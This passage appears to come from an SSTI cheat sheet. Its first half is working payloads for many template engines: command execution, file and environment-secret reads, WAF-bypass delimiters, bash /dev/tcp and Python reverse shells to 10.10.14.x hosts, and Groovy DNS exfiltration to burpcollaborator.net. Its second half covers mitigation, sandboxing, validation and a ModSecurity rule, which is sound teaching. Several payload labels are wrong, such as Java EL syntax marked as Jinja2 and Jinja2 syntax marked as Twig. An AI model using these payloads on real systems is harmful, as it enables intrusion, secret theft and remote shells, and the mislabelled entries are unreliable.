### Template-Specific Bypasses

**Spring Framework - Multiple Expression Delimiters:**
If `${...}` doesn't work, try:
- `#{...}`
- `*{...}`
- `@{...}`
- `~{...}`

**Jinja2 WAF Bypass Resources:**
- [https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)

---

## Top 10 Modern Robust Payloads

### 1. Jinja2 Context-Independent RCE
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### 2. Jinja2 Without Object Class
```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
```

### 3. Jinja2 Blind RCE via Warning Class
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.cmd).read()}}{%endif%}{%endfor%}
```

### 4. FreeMarker Universal RCE
```python
${"freemarker.template.utility.Execute"?new()("id")}
```

### 5. Spring/Thymeleaf RCE
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### 6. Node.js Nunjucks RCE
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### 7. Ruby ERB Universal RCE
```ruby
<%= `id` %>
```

### 8. Twig Filter-Based RCE
```python
{{['id']|filter('system')}}
```

### 9. Go Template RCE (if System method exists)
```go
{{ .System "id" }}
```

### 10. ASP.NET Razor RCE
```csharp
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

---

## Higher Impact Techniques

### Privilege Escalation

**Session Manipulation (Jinja2):**
```python
${pageContext.request.getSession().setAttribute("admin", true)}
```

**Configuration Manipulation:**
```python
# Write evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# Load and execute
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('whoami',shell=True) }}
```

### Data Exfiltration

**Environment Variables:**
```python
# Jinja2
{{ config }}
{{ config.items() }}

# Java
${T(java.lang.System).getenv()}
```

**File System Access:**
```python
# Jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Twig
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

# FreeMarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

**Directory Listing (Java/EL):**
```bash
${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```

### Reverse Shell Establishment

**Jinja2 Reverse Shell:**
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.11\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

**Twig Reverse Shell:**
```python
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.3/8000 0>&1"',shell=True) }}
```

**Node.js Reverse Shell:**
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```

### Blind SSTI Exploitation

**Time-Based Detection:**
```bash
# Java/EL - Sleep 10 seconds
${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```

**Out-of-Band Exfiltration:**
```python
# Groovy - DNS exfiltration
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "whoami";
    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".burpcollaborator.net";
    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x
```

---

## Mitigation & Securing Applications

### Developer Best Practices

#### 1. Never Render User Input Directly

**Vulnerable Code (Flask/Jinja2):**
```python
from flask import Flask, request, render_template_string

@app.route('/')
def home():
    if request.args.get('user'):
        # VULNERABLE: Direct rendering of user input
        return render_template_string('Welcome ' + request.args.get('user'))
    return render_template_string('Hello World!')
```

**Secure Code:**
```python
@app.route('/')
def home():
    if request.args.get('user'):
        # SECURE: Use template variables
        return render_template_string('Welcome {{ username }}', username=request.args.get('user'))
    return render_template_string('Hello World!')
```

#### 2. Use Sandboxed Environments

When intentional template injection is needed:
- Enable sandboxed mode in the template engine
- Restrict available functions and modules
- Implement whitelist-based filtering

**Example (Jinja2 Sandbox):**
```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_input)
```

#### 3. Input Validation & Sanitization

- Validate all user inputs against expected patterns
- Reject inputs containing template syntax characters
- Use context-aware escaping

**Blacklist Approach (Not Recommended):**
```python
# Problematic: Easily bypassed
dangerous_chars = ['{{', '}}', '{%', '%}', '${', '}']
for char in dangerous_chars:
    if char in user_input:
        raise ValueError("Invalid input")
```

**Whitelist Approach (Recommended):**
```python
import re
# Only allow alphanumeric and specific characters
if not re.match(r'^[a-zA-Z0-9\s\-_]+$', user_input):
    raise ValueError("Invalid input")
```

#### 4. Content Security Policy (CSP)

Implement CSP headers to mitigate XSS via SSTI:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

#### 5. Disable Dangerous Features

- Disable dynamic template generation from strings
- Remove or restrict access to dangerous template functions
- Use minimal template engines when possible

#### 6. Regular Security Audits

- Review template rendering code regularly
- Use static analysis tools to detect SSTI vulnerabilities
- Perform penetration testing

### Framework-Specific Mitigations

**Jinja2:**
```python
# Use autoescape
from jinja2 import Environment
env = Environment(autoescape=True)

# Disable dangerous globals
env.globals.clear()
```

**Twig:**
```php
// Enable sandbox
$twig = new Twig_Environment($loader, array(
    'sandbox' => true
));
```

**Spring:**
```java
// Disable SpEL evaluation in user input
// Use @Value with static values only
// Avoid PropertyPlaceholderConfigurer with user input
```

### Monitoring & Detection

**Log Analysis:**
- Monitor for template syntax in logs
- Alert on error messages revealing template engines
- Track unusual application behavior

**WAF Rules:**
- Block common SSTI payloads
- Detect template syntax patterns
- Rate limit suspicious requests

**Example ModSecurity Rule:**
```
SecRule ARGS "@rx (\{\{|\}\}|\{%|%\}|\$\{)" \
    "id:1000,phase:2,deny,status:403,msg:'Possible SSTI attempt'"
```

---

## Useful Wordlists & Resources

### Detection Wordlists

**Generic Variables:**
- [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
- [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)
- [https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt)

### Tools & Frameworks

**Automated Scanners:**
- **TInjA:** [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
- **SSTImap:** [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
- **Tplmap:** [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
- **Fenjing:** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing)

**Reference Tables:**
- **Template Injection Table:** [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

### Learning Resources

**Official Documentation:**
- Jinja2: [https://jinja.palletsprojects.com/](https://jinja.palletsprojects.com/)
- Twig: [https://twig.symfony.com/](https://twig.symfony.com/)
- FreeMarker: [https://freemarker.apache.org/](https://freemarker.apache.org/)

**Research Papers & Articles:**
- PortSwigger Research: [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
- BlackHat Presentation: [Server-Side Template Injection: RCE for the Modern Web App](BlackHat PDF referenced in documents)
- Jinja2 Context-Independent RCE: [https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/)

**Payload Collections:**
- PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- PayloadBox SSTI: [https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)

**Practice Platforms:**
- PortSwigger Web Security Academy: [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- Vulnerable Applications: [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

### Community Resources

**Bug Bounty Write-ups:**
- HackerOne SSTI Reports
- Write-up Collections: [https://github.com/TeamGreyFang/CTF-Writeups](https://github.com/TeamGreyFang/CTF-Writeups)

**Cheat Sheets:**
- Flask/Jinja2 SSTI: [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- Pentest Book SSTI Section

---

## Summary

Server-Side Template Injection (SSTI) remains a critical vulnerability across multiple platforms and languages. Success in exploitation requires:

1. **Proper Detection:** Use polyglot payloads and systematic testing
2. **Engine Identification:** Recognize template syntax patterns
3. **Payload Crafting:** Understand language-specific exploitation chains
4. **Bypass Techniques:** Master encoding and obfuscation methods
5. **Security Awareness:** Implement proper input validation and sandboxing

Always ensure testing is performed within authorized scope and ethical boundaries. SSTI vulnerabilities can lead to complete system compromise and should be treated with appropriate severity.